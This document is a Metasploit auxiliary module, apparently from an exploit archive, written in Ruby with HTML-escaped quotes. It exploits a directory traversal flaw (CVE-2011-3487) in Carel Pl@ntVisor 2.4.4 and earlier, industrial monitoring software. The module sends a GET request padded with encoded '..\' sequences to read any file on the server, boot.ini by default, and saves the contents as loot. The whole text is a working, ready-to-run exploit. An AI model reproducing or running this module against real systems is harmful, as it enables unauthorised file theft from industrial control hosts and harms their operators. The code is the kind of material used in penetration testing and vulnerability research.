 
class MetasploitModule < Msf::Auxiliary
    Rank = GreatRanking
 
    include Msf::Exploit::Remote::HttpClient
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Carel Pl@ntVisor Directory Traversal&#039;,
            &#039;Description&#039;    => %q{
                This module exploits a directory traversal vulnerability
                found in Carel Pl@ntVisor <= 2.4.4. The vulnerability is
                triggered by sending a specially crafted GET request to the
                victim server.
            },
            &#039;Author&#039;         => [ &#039;james fitts&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-3487&#039; ],
                    [ &#039;BID&#039;, &#039;49601&#039; ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jun 29 2012&#039;))
 
        register_options(
            [
                OptInt.new(&#039;DEPTH&#039;, [ false, &#039;Levels to reach base directory&#039;, 10]),
                OptString.new(&#039;FILE&#039;, [ false, &#039;This is the file to download&#039;, &#039;boot.ini&#039;]),
                Opt::RPORT(80)
            ], self.class )
    end
 
    def run
 
    depth = (datastore[&#039;DEPTH&#039;].nil? or datastore[&#039;DEPTH&#039;] == 0) ? 10 : datastore[&#039;DEPTH&#039;]
    levels = "/" + ("..%5c" * depth)
 
    res = send_request_raw({
        &#039;method&#039;    => &#039;GET&#039;,
        &#039;uri&#039;       => "#{levels}#{datastore[&#039;FILE&#039;]}",
    })
 
    if res and res.code == 200
        loot = res.body
        if not loot or loot.empty?
            print_status("File from #{rhost}:#{rport} is empty...")
            return
        end
        file = ::File.basename(datastore[&#039;FILE&#039;])
        path = store_loot(&#039;plantvisor.file&#039;, &#039;application/octet-stream&#039;, rhost, loot, file, datastore[&#039;FILE&#039;])
        print_status("Stored #{datastore[&#039;FILE&#039;]} to #{path}")
        return
    end
 
    end
end

